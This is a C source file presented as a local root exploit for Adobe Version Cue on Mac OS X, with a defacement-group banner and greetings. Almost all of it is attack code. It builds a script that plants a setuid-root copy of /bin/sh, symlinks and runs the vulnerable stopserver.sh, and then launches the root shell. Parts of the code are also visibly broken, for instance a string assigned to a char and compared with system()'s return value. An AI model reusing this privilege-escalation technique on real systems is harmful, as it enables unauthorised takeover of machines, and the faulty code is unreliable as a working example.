/************************************************************************************************\
 [ Mac OS X - Adobe Version Cue local root exploit ]
                    c version exploit
                --=== by ActionSpider ===--
                     Iam sun-os hehehe                                                                                   ActionSpider@Linuxmail.org

[http://www.Ashiyane.com]
[http://www.Ashiyane.net]
[http://defacers.com.mx ]

*************************************************************************************************|
Greetz to: [ Behrooz & Nima  &  Ehsan & str0ke & Status-x  & Mafia_Boy  &  stealh  ]
&&
Greetz to: [  and all member of SegmentationFault Group
                                                                                                 Code written By ActionSpider Mac OS X - Adobe Version [C] version
Exploit;)
\************************************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>


int main(){
int x =1;
char a= "root";


printf("\t[ Mac OS X - Adobe Version Cue local root exploit ]\n");
printf("\t\t--==Code written By ActionSpider==--\n");
printf("\t\t --=ActionSpider@Linuxmail.org=--\n");
printf("\t\t\t[ www.Ashiayne.com ]\n\n\n");


printf("w8 for geting root man...\n");
for (x=1;x<=75;x++){
        printf("#");}



printf("\nyour id now:");
system("id");
printf("touch productname.sh...");
system("echo cp /bin/sh /Users/$USER; >> productname.sh");
system("echo chmod 4755 /Users/$USER/sh; >> productname.sh");
system("echo chown root /Users/$USER/sh >> productname.sh");
printf("chmod productname.sh 0755");
system("chmod 0755 ./productname.sh");
printf("ok w8 for touch link...");
system("ln -s $path/stopserver.sh");
printf("exection it :p hehe\n");
system("./stopserver.sh");
system("./sh");
printf("ok w8 for see system rooted or not \n\n");


system("id");
       if (system("whoami") == a)
printf("\n\n ok system now rooted hehe...:P");
       else
printf("sory this server is patch :(\n");

}

